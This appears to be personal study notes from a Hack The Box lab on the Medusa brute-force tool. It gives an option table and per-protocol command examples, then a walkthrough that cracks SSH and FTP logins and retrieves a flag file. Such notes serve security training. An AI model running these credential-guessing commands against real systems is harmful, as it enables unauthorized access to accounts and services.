# Medusa Guide
## Installation
```bash
sudo apt-get -y update
sudo apt-get -y install medusa
```
## Command Syntax and Parameter Table
Medusa's command-line interface is straightforward. It allows users to specify hosts, users, passwords, and modules with various options to fine-tune the attack process.
```shell-session
Kolbesmith24@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]
```

| Parameter                  | Explanation                                                                                                                              | Usage Example                                                                                                                                                      |
| -------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `-h HOST` or `-H FILE`     | Target options: Specify either a single target hostname or IP address (`-h`) or a file containing a list of targets (`-H`).              | `medusa -h 192.168.1.10 ...` or `medusa -H targets.txt ...`                                                                                                        |
| `-u USERNAME` or `-U FILE` | Username options: Provide either a single username (`-u`) or a file containing a list of usernames (`-U`).                               | `medusa -u admin ...` or `medusa -U usernames.txt ...`                                                                                                             |
| `-p PASSWORD` or `-P FILE` | Password options: Specify either a single password (`-p`) or a file containing a list of passwords (`-P`).                               | `medusa -p password123 ...` or `medusa -P passwords.txt ...`                                                                                                       |
| `-M MODULE`                | Module: Define the specific module to use for the attack (e.g., `ssh`, `ftp`, `http`).                                                   | `medusa -M ssh ...`                                                                                                                                                |
| `-m "MODULE_OPTION"`       | Module options: Provide additional parameters required by the chosen module, enclosed in quotes.                                         | `medusa -M http -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&password=^PASS^" ...` |
| `-t TASKS`                 | Tasks: Define the number of parallel login attempts to run, potentially speeding up the attack.                                          | `medusa -t 4 ...`                                                                                                                                                  |
| `-f` or `-F`               | Fast mode: Stop the attack after the first successful login is found, either on the current host (`-f`) or any host (`-F`).              | `medusa -f ...` or `medusa -F ...`                                                                                                                                 |
| `-n PORT`                  | Port: Specify a non-default port for the target service.                                                                                 | `medusa -n 2222 ...`                                                                                                                                               |
| `-v LEVEL`                 | Verbose output: Display detailed information about the attack's progress. The higher the `LEVEL` (up to 6), the more verbose the output. | `medusa -v 4 ...`                                                                                                                                                  |

## Medusa Modules
Each module in Medusa is tailored to interact with specific authentication mechanisms, allowing it to send the appropriate requests and interpret responses for successful attacks. Below is a table of commonly used modules:

|Medusa Module|Service/Protocol|Description|Usage Example|
|---|---|---|---|
|FTP|File Transfer Protocol|Brute-forcing FTP login credentials, used for file transfers over a network.|`medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`|
|HTTP|Hypertext Transfer Protocol|Brute-forcing login forms on web applications over HTTP (GET/POST).|`medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^`|
|IMAP|Internet Message Access Protocol|Brute-forcing IMAP logins, often used to access email servers.|`medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`|
|MySQL|MySQL Database|Brute-forcing MySQL database credentials, commonly used for web applications and databases.|`medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`|
|POP3|Post Office Protocol 3|Brute-forcing POP3 logins, typically used to retrieve emails from a mail server.|`medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`|
|RDP|Remote Desktop Protocol|Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems.|`medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`|
|SSHv2|Secure Shell (SSH)|Brute-forcing SSH logins, commonly used for secure remote access.|`medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`|
|Subversion (SVN)|Version Control System|Brute-forcing Subversion (SVN) repositories for version control.|`medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`|
|Telnet|Telnet Protocol|Brute-forcing Telnet services for remote command execution on older systems.|`medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`|
|VNC|Virtual Network Computing|Brute-forcing VNC login credentials for remote desktop access.|`medusa -M vnc -h 192.168.1.100 -P passwords.txt`|
|Web Form|Brute-forcing Web Login Forms|Brute-forcing login forms on websites using HTTP POST requests.|`medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`|
### Targeting an SSH Server
Imagine a scenario where you need to test the security of an SSH server at `192.168.0.100`. You have a list of potential usernames in `usernames.txt` and common passwords in `passwords.txt`. To launch a brute-force attack against the SSH service on this server, use the following Medusa command:
```bash
medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
```
Instructs Medusa to:
- Target the host at `192.168.0.100`.
- Use the usernames from the `usernames.txt` file.
- Test the passwords listed in the `passwords.txt` file.
- Employ the `ssh` module for the attack.

Medusa will systematically try each username-password combination against the SSH service to attempt to gain unauthorized access.
### Targeting Multiple Web Servers with Basic HTTP Authentication
Suppose you have a list of web servers that use basic HTTP authentication. These servers' addresses are stored in `web_servers.txt`, and you also have lists of common usernames and passwords in `usernames.txt` and `passwords.txt`, respectively. To test these servers concurrently, execute:
```bash
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
```
Medusa will:
- Iterate through the list of web servers in `web_servers.txt`.
- Use the usernames and passwords provided.
- Employ the `http` module with the `GET` method to attempt logins.

By running multiple threads, Medusa efficiently checks each server for weak credentials.
### Testing for Empty or Default Passwords
If you want to assess whether any accounts on a specific host (`10.0.0.5`) have empty or default passwords (where the password matches the username), you can use:
```bash
Kolbesmith24@htb[/htb]$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```
Instructs Medusa to:
- Target the host at `10.0.0.5`.
- Use the usernames from `usernames.txt`.
- Perform additional checks for empty passwords (`-e n`) and passwords matching the username (`-e s`).
- Use the appropriate service module (replace `service_name` with the correct module name).

Medusa will try each username with an empty password and then with the password matching the username, potentially revealing accounts with weak or default configurations.
# Web Services
## Kick-off
We can start once we have a SSH or FTP server running on a remote system.
### Example
Assuming prior knowledge of the username `sshuser`, we can leverage Medusa to attempt different password combinations until successful authentication is achieved systematically.

The following command serves as our starting point:
```bash
medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```
- `-h <IP>`: Specifies the target system's IP address.
- `-n <PORT>`: Defines the port on which the SSH service is listening (typically port 22).
- `-u sshuser`: Sets the username for the brute-force attack.
- `-P 2023-200_most_used_passwords.txt`: Points Medusa to a wordlist containing the 200 most commonly used passwords in 2023. The effectiveness of a brute-force attack is often tied to the quality and relevance of the wordlist used.
- `-M ssh`: Selects the SSH module within Medusa, tailoring the attack specifically for SSH authentication.
- `-t 3`: Dictates the number of parallel login attempts to execute concurrently. Increasing this number can speed up the attack but may also increase the likelihood of detection or triggering security measures on the target system.
> Upon execution, Medusa will display its progress as it cycles through the password combinations. The output will indicate a successful login, revealing the correct password.
### Gaining Access
Once we find the password, we can establish a connection with SSH:
```bash
ssh sshuser@<IP> -p PORT
```
### Expanding the Attack Surface
Once inside the system, the next step is identifying other potential attack surfaces. Using `netstat` (within the SSH session) to list open ports and listening services, you discover a service running on port 21.
```bash
netstat -tulpn | grep LISTEN
```

Further reconnaissance with `nmap` (within the SSH session) confirms this finding as an ftp server.
```bash
nmap localhost
```
### Targeting the FTP Server
Now we can proceed to brute-force FTPs authentication mechanism.

If we explore the `/home` directory on the target system, we see an `ftpuser` folder, which implies the likelihood of the FTP server username being `ftpuser`. Based on this, we can modify our Medusa command accordingly:
```bash
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5 | grep "ACCOUNT FOUND"

```
- `-h 127.0.0.1`: Targets the local system, as the FTP server is running locally. Using the IP address tells medusa explicitly to use IPv4.
- `-u ftpuser`: Specifies the username `ftpuser`.
- `-M ftp`: Selects the FTP module within Medusa.
- `-t 5`: Increases the number of parallel login attempts to 5.
### Retrieving The Flag
Upon successfully cracking the FTP password, establish an FTP connection. Within the FTP session, use the `get` command to download the `flag.txt` file, which may contain sensitive information.:
```bash
ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
```
```bash
get flag.txt
```